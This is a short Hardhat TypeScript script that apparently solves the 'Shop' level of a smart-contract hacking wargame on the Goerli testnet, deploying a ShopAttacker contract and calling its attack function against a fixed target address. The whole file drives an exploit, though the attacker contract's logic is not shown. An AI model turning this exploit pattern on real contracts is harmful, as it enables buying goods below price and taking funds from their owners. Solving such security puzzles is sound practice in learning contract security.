import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "Shop"
const CONTRACT_ADDRESS = "0xc121FB9cD553C73C34228C42d95C0F7a2728dEF7"
const CONTRACT_NAME_ATTACKER = "ShopAttacker"

async function main() {
    const Shop = await ethers.getContractFactory(CONTRACT_NAME)
    const contract = Shop.attach(CONTRACT_ADDRESS)

    const ShopAttacker = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const contractAttacker = await ShopAttacker.connect(attacker).deploy()
    await contractAttacker.deployed()

    let tx: TransactionResponse = await contractAttacker.connect(attacker).attack(CONTRACT_ADDRESS, { gasLimit: 1000000 })
    await tx.wait()

    console.log("Shop: got the item from the shop for less than the price asked");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });